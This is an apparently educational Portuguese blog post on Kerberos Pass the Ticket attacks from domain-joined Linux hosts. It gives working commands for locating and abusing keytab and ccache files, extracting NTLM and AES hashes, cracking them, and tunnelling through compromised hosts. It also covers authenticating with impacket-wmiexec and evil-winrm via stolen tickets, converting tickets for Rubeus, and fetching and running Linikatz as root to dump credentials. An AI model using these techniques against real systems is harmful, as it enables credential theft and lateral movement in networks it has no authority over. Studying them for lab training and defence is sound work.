---
title: "Pass the Ticket (PtT) a partir do Linux"
date: 2026-08-06 10:00:00 -0300
categories: [Conceitos, Linux]
tags: [linux, kerberos, pass-the-ticket, overpass-the-hash, keytab, ccache, impacket, evil-winrm, linikatz]
---

Sistemas Linux integrados ao **Active Directory** costumam usar **Kerberos** para autenticação centralizada, permitindo que usuários acessem recursos tanto Linux quanto Windows com uma única identidade. Se um sistema desses for comprometido, atacantes podem procurar por tickets Kerberos armazenados em diferentes locais para se passar por usuários e realizar ataques de **Pass the Ticket (PtT)**.

Linux e Windows usam o mesmo processo de autenticação Kerberos, mas diferem em como os tickets Kerberos são armazenados. Na maioria dos sistemas Linux, os tickets Kerberos são salvos como arquivos **ccache**, geralmente no diretório `/tmp`, com sua localização referenciada pela variável de ambiente `KRB5CCNAME`. Usuários com privilégios elevados ou root podem acessar esses arquivos de ticket e potencialmente usá-los em ataques de **Pass the Ticket (PtT)**. Sistemas Linux também podem usar arquivos **keytab**, que armazenam principals do Kerberos e chaves criptografadas para permitir autenticação sem senha. Arquivos keytab são comumente usados por scripts e serviços automatizados para se autenticar em recursos protegidos pelo Kerberos sem exigir interação do usuário.

O comando `realm list` pode ser usado para determinar se um sistema Linux está integrado a um domínio do **Active Directory** e para exibir detalhes da configuração Kerberos, incluindo o nome do domínio e usuários ou grupos permitidos. Se a ferramenta `realm` não estiver disponível, a presença de serviços como **SSSD** ou **Winbind** também pode indicar integração com o Active Directory. Identificar um sistema Linux integrado ao domínio é um passo importante ao avaliar a autenticação Kerberos e possíveis oportunidades de **Pass the Ticket (PtT)**.

```bash
realm list
ps -ef | grep -i "winbind\|sssd"
```

## Encontrando Arquivos Keytab

Arquivos keytab geralmente podem ser encontrados buscando no sistema de arquivos por nomes contendo **`keytab`**, já que administradores costumam usar a extensão `.keytab` para arquivos de autenticação Kerberos. Esses arquivos exigem permissões de leitura adequadas para serem usados e também podem ser referenciados em scripts automatizados, como **cron jobs**, onde comandos como `kinit` autenticam contas de serviço sem exigir uma senha em texto plano. Analisar esses scripts pode revelar tanto a localização dos arquivos keytab quanto a identidade das contas que eles autenticam.

```bash
find / -name *keytab* -ls 2>/dev/null
crontab -l
```

Assim que um keytab válido é obtido, ele pode ser importado na sessão atual com o `kinit` para solicitar um **Ticket Granting Ticket (TGT)** e se passar pelo usuário ou conta de serviço associada. Além de keytabs de usuário e de conta de serviço, sistemas Linux integrados ao domínio mantêm um keytab de conta de computador em **`/etc/krb5.keytab`**, que geralmente só é acessível pelo usuário root. Se esse arquivo for comprometido, um atacante pode se autenticar como a conta de computador e interagir com o Active Directory usando sua identidade.

## Abusando de Arquivos Keytab

Um arquivo **keytab** pode ser usado para se passar pela conta para a qual foi criado, solicitando tickets Kerberos sem saber a senha da conta. O comando `klist -k` identifica o principal armazenado no keytab, enquanto `kinit -k -t <keytab>` carrega o keytab e solicita um **Ticket Granting Ticket (TGT)** para aquela conta. Após a autenticação, o `klist` pode ser usado para verificar que o ticket Kerberos atual agora pertence ao usuário personificado.

Assim que o ticket é carregado, ferramentas compatíveis com Kerberos, como o `smbclient`, conseguem se autenticar automaticamente, permitindo acesso aos recursos autorizados para a conta personificada, como compartilhamentos SMB. Como o `kinit` substitui as credenciais Kerberos atuais na sessão ativa, é recomendável fazer backup do arquivo **ccache** existente referenciado pela variável de ambiente `KRB5CCNAME` antes de importar um novo keytab, preservando o contexto de autenticação original.

## Extração de Keytab

Além de personificar usuários, arquivos **keytab** também podem ser usados para extrair segredos de autenticação Kerberos. Ferramentas como o [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) analisam um arquivo keytab e recuperam informações valiosas, incluindo o realm Kerberos, o service principal e material de autenticação como hashes **NTLM**, **AES-128** e **AES-256**. Essas credenciais extraídas podem então ser aproveitadas para ataques subsequentes.

```bash
python3 /opt/keytabextract.py /opt/specialfiles/<USER>.keytab
```

O hash **NTLM** recuperado pode ser usado diretamente em ataques de **Pass the Hash (PtH)**, enquanto as chaves **AES** podem ser usadas para ataques de **OverPass the Hash (Pass the Key)** ou quebradas para recuperar a senha em texto plano. Um único arquivo keytab pode conter múltiplas credenciais e diferentes tipos de criptografia, possivelmente pertencentes a várias contas. A recuperação de senha pode ser tentada com ferramentas como **Hashcat** ou **John the Ripper**, ou verificando bancos de dados de senha online quando apropriado, como o [CrackStation](https://crackstation.net/).

Assim que a senha em texto plano é recuperada, o atacante pode se autenticar diretamente como o usuário comprometido e obter uma sessão Kerberos válida. Esse processo pode ser repetido com arquivos keytab adicionais, como os referenciados em tarefas agendadas ou cron jobs, permitindo que atacantes comprometam contas de serviço e continuem escalando privilégios ou se movendo lateralmente por todo o ambiente de Active Directory.

## Encontrando Arquivos ccache

Um arquivo **ccache** armazena os tickets Kerberos válidos de um usuário após a autenticação e geralmente é referenciado pela variável de ambiente `KRB5CCNAME`, que ferramentas compatíveis com Kerberos usam para localizar o cache de credenciais. Na maioria dos sistemas Linux, esses arquivos ficam armazenados no diretório **`/tmp`** e permanecem válidos durante toda a sessão do usuário.

```bash
env | grep -i krb5
ls -la /tmp | grep krb
```

Ao inspecionar variáveis de ambiente ou buscar no diretório `/tmp`, atacantes conseguem identificar arquivos ccache ativos pertencentes a usuários logados. Se um atacante obtiver acesso root ou outro acesso privilegiado, ele pode reutilizar esses tickets Kerberos válidos para se passar por usuários e realizar ataques de **Pass the Ticket (PtT)** sem precisar das senhas dos usuários.

## Abusando de Arquivos ccache

Um arquivo **ccache** pode ser abusado sempre que um atacante tiver acesso de leitura a ele, o que geralmente exige privilégios de **root** ou equivalentes num sistema Linux. Depois de obter privilégios elevados, um atacante pode enumerar o diretório **`/tmp`** para identificar caches de credenciais Kerberos ativos, determinar seus donos e inspecionar associações de grupo para identificar alvos de alto valor, como **Domain Admins**. Assim que um arquivo ccache valioso é encontrado, ele pode ser copiado e carregado na sessão atual definindo a variável de ambiente `KRB5CCNAME`, permitindo que ferramentas compatíveis com Kerberos se autentiquem como o dono do ticket.

Depois de importar o ccache, ferramentas como o `klist` podem verificar o ticket carregado e confirmar seu período de validade antes do uso. Se o ticket ainda for válido, o atacante pode acessar recursos protegidos pelo Kerberos, como compartilhamentos SMB, sem saber a senha do usuário, realizando efetivamente um ataque de **Pass the Ticket (PtT)**. Como arquivos ccache são temporários e expiram quando seus tickets Kerberos associados se tornam inválidos ou os usuários fazem logout, atacantes precisam verificar o horário de expiração do ticket antes de confiar nele para autenticação.

## Usando Ferramentas de Ataque Linux com Kerberos

Muitas ferramentas ofensivas de Linux, como o **Impacket** e o [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), suportam autenticação Kerberos através de tickets Kerberos existentes. Ao executar essas ferramentas a partir de uma máquina Linux integrada ao domínio, a variável de ambiente `KRB5CCNAME` precisa apontar para o arquivo **ccache** desejado, para que as ferramentas consigam se autenticar usando o ticket armazenado. Se a máquina de ataque **não** estiver integrada ao domínio, ela ainda precisa conseguir se comunicar com o **KDC (Domain Controller)** e resolver corretamente os hostnames do domínio.

Em ambientes onde a conectividade direta com o KDC não está disponível, atacantes podem tunelar o tráfego através de um host comprometido usando o [Chisel](https://github.com/jpillora/chisel) e rotear o tráfego Kerberos com o [Proxychains](https://github.com/haad/proxychains). Além disso, o arquivo `/etc/hosts` pode ser modificado para resolver manualmente nomes de domínio e controladores de domínio. Depois de importar um arquivo **ccache** válido e configurar o `KRB5CCNAME`, ferramentas compatíveis com Kerberos como o Impacket e o Evil-WinRM conseguem se autenticar sem precisar da senha do usuário.

```bash
export KRB5CCNAME=/home/user/<CCACHE_FILE>
```

```bash
proxychains impacket-wmiexec dc01 -k -no-pass
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

### Impacket Ticket Converter

O **Impacket** inclui o utilitário `ticketConverter`, que converte tickets Kerberos entre o formato **ccache** do Linux e o formato **.kirbi** do Windows. Isso permite que tickets Kerberos capturados num sistema operacional sejam reutilizados no outro, facilitando ataques de **Pass the Ticket (PtT)** entre plataformas diferentes.

Depois de converter um ticket para o formato apropriado, ele pode ser importado no sistema operacional alvo usando ferramentas nativas. Por exemplo, um ticket **.kirbi** pode ser injetado numa sessão Windows com o **Rubeus**, e a partir daí o ticket fica imediatamente disponível para autenticação Kerberos.

```bash
impacket-ticketConverter <CCACHE_FILE> <USER>.kirbi
```

```powershell
Rubeus.exe ptt /ticket:c:\tools\<USER>.kirbi
```

### Linikatz

O [Linikatz](https://github.com/CiscoCXSecurity/linikatz) é uma ferramenta de pós-exploração para Linux que desempenha um papel parecido com o do **Mimikatz** no Windows, mirando sistemas integrados ao **Active Directory**. Ele requer **privilégios de root** e extrai credenciais Kerberos, keytabs, tickets em cache, segredos de conta de computador e outros artefatos de autenticação de implementações como **SSSD**, **Samba** e **FreeIPA**.

As credenciais extraídas são organizadas em arquivos de saída, incluindo os formatos **ccache** e **keytab**, que podem então ser reutilizados em ataques como **Pass the Ticket (PtT)**, **Pass the Key (OverPass the Hash)**, ou personificação com o `kinit`. Isso torna o Linikatz uma ferramenta valiosa para coletar credenciais Kerberos de sistemas Linux comprometidos.

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh
sudo ./linikatz.sh
```